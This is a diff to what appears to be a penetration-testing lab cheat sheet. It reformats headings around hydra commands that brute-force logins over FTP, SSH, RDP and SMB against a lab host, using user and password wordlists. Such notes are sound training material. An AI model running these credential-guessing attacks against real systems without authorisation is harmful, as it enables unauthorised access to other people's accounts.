@@ -12,12 +12,14 @@ hydra -v -L user.lst -P word.lst -e nsr fileserver.snakeoil.net ftp
 ```
 hydra -L user.list -P password.list ssh://10.129.42.197
 ```
-############ RDP ############
+# RDP
+```
 hydra -L user.list -P password.list rdp://10.129.42.197
-
-############ SMB ############
+```
+# SMB
+```
 hydra -L user.list -P password.list smb://10.129.42.197
-
+```
 
 
 ############ FLAGS ############
